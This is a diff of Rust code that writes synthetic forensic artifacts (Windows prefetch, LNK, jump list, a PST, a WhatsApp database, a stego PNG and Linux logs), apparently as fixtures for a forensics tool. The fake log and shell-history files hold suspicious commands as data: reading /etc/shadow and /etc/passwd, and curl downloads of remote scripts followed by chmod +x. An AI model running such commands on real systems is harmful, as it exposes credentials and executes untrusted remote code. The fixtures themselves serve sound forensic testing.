@@ -246,6 +246,143 @@ pub fn write_v2_extras(dest: &Path) {
     write_synthetic_evtx(&dest.join("Security.evtx"));
     write_synthetic_pcap(&dest.join("capture.pcap"));
     write_macos_profile(&dest.join("macos_profile"));
+    write_v21_extras(dest);
+}
+
+/// V2.1 backlog fixtures — Windows artifacts, stego, email, chat, Linux.
+pub fn write_v21_extras(dest: &Path) {
+    let prefetch_dir = dest.join("Windows/Prefetch");
+    std::fs::create_dir_all(&prefetch_dir).expect("prefetch dir");
+    write_synthetic_prefetch(&prefetch_dir.join("NOTEPAD.EXE-ABC123.pf"));
+    write_synthetic_lnk(&dest.join("recent/notepad.lnk"));
+    write_synthetic_jump_list(&dest.join("AutomaticDestinations-ms/f01b4d95cf55d32a.automaticDestinations-ms"));
+    write_stego_png(&dest.join("stego_sample.png"));
+    write_synthetic_pst(&dest.join("mailbox.pst"));
+    write_whatsapp_db(&dest.join("whatsapp/msgstore.db"));
+    write_linux_logs(&dest.join("linux_logs"));
+}
+
+fn write_synthetic_prefetch(path: &Path) {
+    let mut data = vec![0u8; 0x100];
+    data[0..4].copy_from_slice(b"SCCA");
+    data[4..8].copy_from_slice(&30u32.to_le_bytes());
+    let name = "NOTEPAD.EXE";
+    for (i, ch) in name.encode_utf16().enumerate() {
+        let off = 0x10 + i * 2;
+        data[off..off + 2].copy_from_slice(&ch.to_le_bytes());
+    }
+    data[0x48..0x4C].copy_from_slice(&12u32.to_le_bytes());
+    std::fs::write(path, data).expect("write prefetch");
+}
+
+fn write_synthetic_lnk(path: &Path) {
+    std::fs::create_dir_all(path.parent().expect("lnk parent")).expect("lnk dir");
+    let target = "C:\\Windows\\System32\\notepad.exe";
+    let mut data = vec![0u8; 0x200];
+    data[0..4].copy_from_slice(&0x4Cu32.to_le_bytes());
+    data[0x14..0x18].copy_from_slice(&0x02u32.to_le_bytes()); // HasLinkInfo
+    let link_info_size = 0x50u32;
+    data[0x4C..0x50].copy_from_slice(&link_info_size.to_le_bytes());
+    data[0x5C..0x60].copy_from_slice(&0x1Cu32.to_le_bytes());
+    let local_off = 0x1Cu32;
+    data[0x60..0x64].copy_from_slice(&local_off.to_le_bytes());
+    let base = 0x4C + 0x1C;
+    data[base..base + target.len()].copy_from_slice(target.as_bytes());
+    std::fs::write(path, data).expect("write lnk");
+}
+
+fn write_synthetic_jump_list(path: &Path) {
+    std::fs::create_dir_all(path.parent().expect("jl parent")).expect("jl dir");
+    let mut data = vec![0u8; 512];
+    data[0..8].copy_from_slice(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]);
+    let path_utf16: Vec<u8> = "C:\\Users\\Analyst\\Documents\\report.docx"
+        .encode_utf16()
+        .flat_map(|c| c.to_le_bytes())
+        .collect();
+    data[128..128 + path_utf16.len()].copy_from_slice(&path_utf16);
+    std::fs::write(path, data).expect("write jump list");
+}
+
+fn write_stego_png(path: &Path) {
+    let mut png = vec![
+        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48,
+        0x44, 0x52, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x10, 0x08, 0x02, 0x00, 0x00,
+        0x00, 0x90, 0x91, 0x68, 0x36,
+    ];
+    let mut idat = vec![0u8; 256];
+    for (i, b) in idat.iter_mut().enumerate() {
+        *b = if i % 3 == 0 { 0xFE } else { 0xFF };
+    }
+    let chunk_len = (idat.len() as u32).to_be_bytes();
+    png.extend_from_slice(&chunk_len);
+    png.extend_from_slice(b"IDAT");
+    png.extend_from_slice(&idat);
+    png.extend_from_slice(&0u32.to_be_bytes());
+    png.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82]);
+    let secret = b"hidden";
+    png.extend_from_slice(secret);
+    std::fs::write(path, png).expect("write stego png");
+}
+
+fn write_synthetic_pst(path: &Path) {
+    let mut data = vec![0u8; 0x2000];
+    data[0..4].copy_from_slice(&0x4E444221u32.to_le_bytes());
+    data[10..12].copy_from_slice(&23u16.to_le_bytes());
+    let header = "Subject: Quarterly Report Review\nFrom: cfo@corp.example.com\nTo: analyst@corp.example.com\nDate: 2026-06-01\nBody: Please review attached financials.\0";
+    data[0x400..0x400 + header.len()].copy_from_slice(header.as_bytes());
+    let folder = "Inbox\0Sent Items\0";
+    data[0x800..0x800 + folder.len()].copy_from_slice(folder.as_bytes());
+    std::fs::write(path, data).expect("write pst");
+}
+
+fn write_whatsapp_db(path: &Path) {
+    std::fs::create_dir_all(path.parent().expect("wa parent")).expect("wa dir");
+    let _ = std::fs::remove_file(path);
+    let conn = rusqlite::Connection::open(path).expect("wa db");
+    conn.execute_batch(
+        "CREATE TABLE messages (
+            _id INTEGER PRIMARY KEY,
+            key_remote_jid TEXT,
+            remote_resource TEXT,
+            data TEXT,
+            timestamp INTEGER,
+            media_wa_type INTEGER
+        );",
+    )
+    .expect("wa schema");
+    conn.execute(
+        "INSERT INTO messages (key_remote_jid, remote_resource, data, timestamp, media_wa_type) VALUES (?1, ?2, ?3, ?4, ?5)",
+        rusqlite::params![
+            "1234567890@s.whatsapp.net",
+            "+1234567890",
+            "Meeting moved to 3pm — confirm attendance",
+            1_700_000_000_000i64,
+            0i64
+        ],
+    )
+    .expect("wa insert");
+}
+
+fn write_linux_logs(root: &Path) {
+    std::fs::create_dir_all(root).expect("linux dir");
+    std::fs::write(
+        root.join("auth.log"),
+        "Jun  6 10:15:01 workstation sshd[1234]: Accepted password for analyst from 192.168.1.50 port 22\n\
+         Jun  6 10:16:44 workstation sshd[1235]: Failed password for invalid user admin from 10.0.0.99 port 4444\n\
+         Jun  6 10:17:02 workstation sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/cat /etc/shadow\n",
+    )
+    .expect("auth.log");
+    std::fs::write(
+        root.join("audit.log"),
+        "type=USER_AUTH msg=audit(1717665301.123:456): pid=1234 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:authentication grantors=pam_unix acct=analyst exe=/usr/sbin/sshd'\n\
+         type=EXECVE msg=audit(1717665400.456:789): pid=5678 uid=1000 auid=1000 ses=1 exe=/usr/bin/curl cmd=curl -s https://example.com/payload.sh\n",
+    )
+    .expect("audit.log");
+    std::fs::write(
+        root.join(".bash_history"),
+        "ls -la /var/log\nsudo cat /etc/passwd\ncurl -O https://cdn.example.com/tool.sh\nchmod +x tool.sh\n",
+    )
+    .expect("bash_history");
 }
 
 /// CollectionLoom-style signed hash_manifest.json for integrity verification tests.
